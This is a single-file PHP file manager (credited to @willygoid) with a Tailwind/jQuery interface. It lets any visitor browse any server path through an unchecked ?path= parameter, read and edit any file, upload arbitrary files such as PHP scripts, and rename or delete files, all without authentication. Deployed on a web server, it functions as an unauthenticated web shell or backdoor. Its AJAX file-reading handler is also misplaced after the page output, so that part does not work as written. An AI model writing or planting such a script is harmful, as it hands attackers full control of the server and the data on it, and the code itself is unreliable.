<?php
// File Manager Sederhana by @willygoid
// Support PHP 5.6+, TailwindCSS, jQuery, CRUD, Upload Multiple Files

$path = isset($_GET['path']) ? realpath($_GET['path']) : getcwd();
if (!$path || !is_dir($path)) $path = getcwd();

$parent = dirname($path);

// Handle create folder
if (isset($_POST['new_folder'])) {
    $new_folder = basename($_POST['new_folder']);
    mkdir($path . DIRECTORY_SEPARATOR . $new_folder);
}

// Handle delete
if (isset($_POST['delete'])) {
    $target = $path . DIRECTORY_SEPARATOR . basename($_POST['delete']);
    if (is_dir($target)) {
        rmdir($target);
    } else {
        unlink($target);
    }
}

// Handle rename
if (isset($_POST['rename_from']) && isset($_POST['rename_to'])) {
    $from = $path . DIRECTORY_SEPARATOR . basename($_POST['rename_from']);
    $to = $path . DIRECTORY_SEPARATOR . basename($_POST['rename_to']);
    rename($from, $to);
}

// Handle upload
if (isset($_FILES['files'])) {
    foreach ($_FILES['files']['tmp_name'] as $idx => $tmp) {
        $name = basename($_FILES['files']['name'][$idx]);
        move_uploaded_file($tmp, $path . DIRECTORY_SEPARATOR . $name);
    }
}

// Handle create file
if (isset($_POST['new_file']) && $_POST['new_file'] != '') {
    $new_file = basename($_POST['new_file']);
    file_put_contents($path . DIRECTORY_SEPARATOR . $new_file, '');
}

// Handle edit file
if (isset($_POST['edit_file']) && isset($_POST['content'])) {
    $edit_file = $path . DIRECTORY_SEPARATOR . basename($_POST['edit_file']);
    file_put_contents($edit_file, $_POST['content']);
}

// Read directory
$files = scandir($path);
?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PHP File Manager</title>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script>
    $(function(){
        $('.edit-btn').click(function(){
            const file = $(this).data('file');
            $.post('', { get_content: file }, function(data){
                $('#editModal textarea').val(data);
                $('#editModal input[name="edit_file"]').val(file);
                $('#editModal').show();
            });
        });
        $('#editModal .close').click(()=>$('#editModal').hide());
    });
    </script>
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
</head>
<body class="bg-gray-100 p-4">
    <h1 class="text-2xl font-bold mb-4">📂 File Manager: <?= htmlspecialchars($path) ?></h1>

    <div class="mb-4">
        <?php if($path != $parent): ?>
            <a class="text-blue-500 underline" href="?path=<?= urlencode($parent) ?>">⬅️ Up Directory</a>
        <?php endif; ?>
    </div>

    <table class="min-w-full bg-white border">
        <tr class="bg-gray-200">
            <th class="p-2 text-left">Name</th>
            <th class="p-2">Type</th>
            <th class="p-2">Action</th>
        </tr>
        <?php foreach ($files as $file): 
            if ($file == '.' || $file == '..') continue;
            $fullpath = $path . DIRECTORY_SEPARATOR . $file;
        ?>
        <tr class="border-t">
            <td class="p-2">
                <?php if(is_dir($fullpath)): ?>
                    <a class="text-blue-500 underline" href="?path=<?= urlencode($fullpath) ?>">📁 <?= htmlspecialchars($file) ?></a>
                <?php else: ?>
                    📄 <?= htmlspecialchars($file) ?>
                <?php endif; ?>
            </td>
            <td class="p-2"><?= is_dir($fullpath) ? 'Folder' : 'File' ?></td>
            <td class="p-2 flex space-x-2">
                <?php if(!is_dir($fullpath)): ?>
                    <button data-file="<?= htmlspecialchars($file) ?>" class="edit-btn bg-yellow-300 px-2 rounded">✏️ Edit</button>
                <?php endif; ?>
                <form method="post" style="display:inline;">
                    <input type="hidden" name="delete" value="<?= htmlspecialchars($file) ?>">
                    <button class="bg-red-400 px-2 rounded" onclick="return confirm('Delete <?= htmlspecialchars($file) ?>?')">🗑️ Delete</button>
                </form>
                <form method="post" style="display:inline;">
                    <input type="hidden" name="rename_from" value="<?= htmlspecialchars($file) ?>">
                    <input type="text" name="rename_to" placeholder="New name" class="border px-1">
                    <button class="bg-green-400 px-2 rounded">↩️ Rename</button>
                </form>
            </td>
        </tr>
        <?php endforeach; ?>
    </table>

    <div class="mt-4 space-y-2">
        <form method="post">
            <input name="new_folder" placeholder="New folder name" class="border px-2">
            <button class="bg-blue-500 text-white px-2 rounded">📁 Create Folder</button>
        </form>
        <form method="post">
            <input name="new_file" placeholder="New file name" class="border px-2">
            <button class="bg-blue-500 text-white px-2 rounded">📄 Create File</button>
        </form>
        <form method="post" enctype="multipart/form-data">
            <input type="file" name="files[]" multiple class="border px-2">
            <button class="bg-blue-500 text-white px-2 rounded">⬆️ Upload Files</button>
        </form>
    </div>

    <!-- Edit Modal -->
    <div id="editModal" class="fixed inset-0 bg-gray-800 bg-opacity-75 hidden items-center justify-center">
        <div class="bg-white p-4 w-1/2 rounded">
            <form method="post">
                <input type="hidden" name="edit_file">
                <textarea name="content" class="w-full h-64 border mb-2"></textarea>
                <div class="flex justify-between">
                    <button class="bg-green-500 text-white px-4 py-1 rounded">💾 Save</button>
                    <button type="button" class="close bg-gray-300 px-4 py-1 rounded">❌ Close</button>
                </div>
            </form>
        </div>
    </div>

    <?php
    // Ajax get_content handler
    if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['get_content'])) {
        $target = $path . DIRECTORY_SEPARATOR . basename($_POST['get_content']);
        if (is_file($target)) echo htmlspecialchars(file_get_contents($target));
        exit;
    }
    ?>
</body>
</html>
